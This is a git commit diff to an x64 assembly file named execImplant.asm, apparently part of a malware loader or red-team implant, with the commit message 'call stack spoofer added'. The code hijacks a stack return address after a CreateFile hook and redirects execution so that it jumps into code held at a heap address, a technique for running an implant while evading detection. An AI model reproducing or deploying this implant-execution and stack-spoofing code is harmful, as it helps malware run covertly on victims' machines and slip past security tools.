dbe4a2c35d3c6ce0f05e99586b15ab46a08dd6ce
avale <105960344+ozempiic@users.noreply.github.com>
2025-03-22 05:34:21 -0400

    Update execImplant.asm
    call stack spoofer added

--- execImplant.asm
+++ execImplant.asm
@@ -3,6 +3,8 @@ extern MainAddr:QWORD
 extern Global_OrigCreateFileReturnAddr:QWORD
 extern HeapAddress:QWORD
 extern SizeOfStack:QWORD
+extern printf:PROC
+extern message:QWORD
 count DWORD 000h
 
 .code
@@ -10,16 +12,15 @@ PUBLIC ExecImplantStub
 PUBLIC HookStub
 
     ExecImplantStub PROC
-
-        call HeapAddress
-        mov rcx, [Global_OrigCreateFileReturnAddr]
-        jmp rcx
-
+        sub rsp, 20h         ; calls printf like sigmer boss
+        lea rcx, message     ; loads the dbg msg
+        call printf          ; prints
+        add rsp, 20h         ; stack restored.. heh.
+        push qword ptr [Global_OrigCreateFileReturnAddr]  ; push org ret addr
+        jmp qword ptr [HeapAddress]                       ; jmp to heapaddr
     ExecImplantStub ENDP
 
-
     HookStub PROC
-
         inc count
         cmp count, 1
         jne skip
@@ -27,17 +28,14 @@ PUBLIC HookStub
         mov rbx, rsp                 
         add rbx, rax                  
         mov rax, qword ptr [rbx]      
-        mov[Global_OrigCreateFileReturnAddr], rax
+        mov [Global_OrigCreateFileReturnAddr], rax
         lea rax, ExecImplantStub
-        mov qword ptr[rbx], rax
-
+        mov qword ptr [rbx], rax
     HookStub ENDP
 
     skip PROC
-
         mov rax, [MainAddr]
         jmp rax
-
     skip ENDP
 
 end
